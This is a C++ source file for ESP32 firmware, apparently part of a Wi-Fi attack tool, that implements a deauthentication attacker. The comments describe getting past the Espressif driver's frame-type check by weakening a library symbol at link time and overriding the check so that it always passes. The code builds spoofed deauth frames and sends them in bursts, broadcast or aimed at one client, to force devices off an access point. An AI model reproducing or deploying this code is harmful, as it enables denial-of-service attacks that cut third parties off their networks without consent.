#include "deauth_attacker.h"
#include "state.h"
#include "net_globals.h"
#include "esp_wifi.h"
#include <cstring>

// esp_wifi_80211_tx() itself only accepts beacon/probe-request/probe-response/
// action/non-QoS-data frames -- everything else (including deauth/disassoc)
// gets rejected at TX time ("unsupport frame type") by a call into
// ieee80211_raw_frame_sanity_check() inside the precompiled libnet80211.a.
// There is no Kconfig option that changes this (confirmed via exhaustive
// search) -- it's enforced in closed-source code, not app-configurable.
//
// The actual bypass real deauth tools (ESP32 Marauder et al.) use: that
// sanity-check symbol is a normal exported function in libnet80211.a, so
// -Wl,--weaken-symbol=ieee80211_raw_frame_sanity_check (see main/CMakeLists.txt)
// demotes the library's copy from strong to weak at link time, letting our
// own same-named definition below win instead and unconditionally report
// "frame is sane" for every frame type, deauth included.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg1, int32_t arg2, int32_t arg3) {
  return 0;
}

#define DEAUTH_ENABLED 1

static bool s_active = false;
static uint8_t s_apMac[6];
static uint8_t s_clientMac[6];
static bool s_broadcast = true;
static uint32_t s_burstSize = 5;
static int s_channel = 1;
static int64_t s_lastBurst = 0;
static const int64_t BURST_INTERVAL_MS = 150;
static bool s_loggedFailure = false;

static const uint8_t BROADCAST[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };

static int buildFrame(uint8_t *out, const uint8_t *da, const uint8_t *sa,
                       const uint8_t *bssid, uint16_t subtype, uint16_t reason) {
  int i = 0;
  out[i++] = (uint8_t)(subtype << 4); // frame control byte0: type=mgmt(0), subtype
  out[i++] = 0x00;                    // frame control byte1
  out[i++] = 0x00; out[i++] = 0x00;   // duration
  memcpy(out + i, da, 6); i += 6;     // addr1
  memcpy(out + i, sa, 6); i += 6;     // addr2
  memcpy(out + i, bssid, 6); i += 6;  // addr3
  out[i++] = 0x00; out[i++] = 0x00;   // seq-ctrl
  out[i++] = (uint8_t)(reason & 0xFF);
  out[i++] = (uint8_t)(reason >> 8);
  return i;
}

void DeauthAttacker::start(int apIndex, const std::string &clientMac, uint32_t packetsPerBurst) {
#if !DEAUTH_ENABLED
  appState.log("[deauth] disabled -- blocked by the esp_wifi driver at the frame-type level, not a config option");
  return;
#else
  std::string ssid, bssid;
  int channel;
  {
    StateLock lock;
    if (apIndex < 0 || apIndex >= (int)appState.aps.size()) {
      appState.log("[deauth] invalid AP index");
      return;
    }
    ssid = appState.aps[apIndex].ssid;
    bssid = appState.aps[apIndex].bssid;
    channel = appState.aps[apIndex].channel;
  }
  strToMac(bssid, s_apMac);
  s_channel = channel;
  s_broadcast = clientMac.empty();
  if (!s_broadcast) strToMac(clientMac, s_clientMac);
  s_burstSize = packetsPerBurst;

  WifiApModeAcquire();
  esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
  appState.mode = OpMode::DEAUTH_ATTACK;
  appState.deauthFramesSent = 0;
  s_active = true;
  s_lastBurst = 0;
  s_loggedFailure = false;
  appState.log("[deauth] attacking " + ssid + " (" + bssid + ") on ch" + std::to_string(s_channel) +
               (s_broadcast ? " [broadcast]" : (" target=" + clientMac)));
#endif
}

void DeauthAttacker::stop() {
  if (!s_active) return;
  s_active = false;
  appState.mode = OpMode::IDLE;
  WifiApModeRelease();
  appState.log("[deauth] attack stopped, " + std::to_string(appState.deauthFramesSent) + " frames sent");
}

bool DeauthAttacker::active() { return s_active; }

void DeauthAttacker::loopSend() {
#if !DEAUTH_ENABLED
  return;
#else
  if (!s_active) return;
  if (nowMs() - s_lastBurst < BURST_INTERVAL_MS) return;
  s_lastBurst = nowMs();

  const uint8_t *target = s_broadcast ? BROADCAST : s_clientMac;
  uint8_t frame[26];

  // Unlike the old "unsupport frame type" rejection (permanent, every call
  // failed identically), ESP_ERR_NO_MEM here is transient: the driver only
  // has 2 static TX buffers for raw/management frames (see boot log:
  // "wifi:Init static tx FG buffer num: 2"), and now that frames actually
  // go out over RF instead of being rejected instantly, each one holds a
  // buffer for real airtime instead of freeing near-instantly. Blasting a
  // whole burst back-to-back with zero pacing can drain that pool inside a
  // single tick. So: stop the burst the moment a send fails instead of
  // continuing to hammer an already-exhausted pool -- the next tick, 150ms
  // later, gives the driver time to actually transmit and free buffers.
  auto sendOne = [&](const uint8_t *da, const uint8_t *sa) -> esp_err_t {
    int len = buildFrame(frame, da, sa, s_apMac, 0xC, 0x0007);
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false);
    if (err == ESP_OK) {
      appState.deauthFramesSent++;
    } else if (!s_loggedFailure) {
      s_loggedFailure = true;
      appState.log("[deauth] esp_wifi_80211_tx failed: " + std::string(esp_err_to_name(err)) +
                    " (buffer pool exhausted -- backing off, this is expected under heavy burst rates)");
    }
    return err;
  };

  for (uint32_t i = 0; i < s_burstSize; i++) {
    if (sendOne(target, s_apMac) != ESP_OK) break; // AP -> client direction
    if (!s_broadcast) {
      // client -> AP direction too, for a more reliable disconnect
      if (sendOne(s_apMac, s_clientMac) != ESP_OK) break;
    }
  }
#endif
}
